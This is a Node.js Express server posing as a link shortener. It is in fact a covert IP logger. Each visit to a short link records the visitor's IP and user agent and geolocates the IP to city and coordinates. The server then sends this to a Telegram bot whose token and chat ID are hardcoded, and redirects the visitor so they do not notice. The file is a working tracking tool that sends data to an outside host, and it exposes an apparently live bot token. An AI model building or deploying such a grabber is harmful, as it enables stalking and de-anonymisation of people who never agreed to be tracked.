const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getLocationFromIP(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.status === 'success') {
      return {
        country: res.data.country,
        city: res.data.city,
        region: res.data.regionName,
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp
      };
    }
  } catch (e) {
    console.log('IP lookup error:', e.message);
  }
  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, location) {
  try {
    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
`;

    if (location) {
      msg += `
🌍 ISP: ${location.isp || 'N/A'}
🏳️ الدولة: ${location.country || 'N/A'}
🏙️ المدينة: ${location.city || 'N/A'}
🗺️ المنطقة: ${location.region || 'N/A'}
📊 Latitude: ${location.latitude || 'N/A'}
📊 Longitude: ${location.longitude || 'N/A'}
🗺️ الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم التحديد
`;
    }

    msg += `
━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg },
      { timeout: 5000 }
    );
    
    console.log('[TG] Message sent');
  } catch (err) {
    console.error('[TG] Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

// الرابط المختصر
app.get('/:code', async (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('Not found');
  }

  const originalUrl = linkStorage[code].original;
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');

  linkStorage[code].clicks++;

  console.log(`[LOG] Code: ${code}, IP: ${ip}`);
  
  // احصل على الموقع من IP
  const location = await getLocationFromIP(ip);
  console.log(`[LOG] Location:`, location);
  
  // أرسل للتلجرام
  sendToTelegram(ip, code, originalUrl, userAgent, location);

  // Redirect مباشر
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));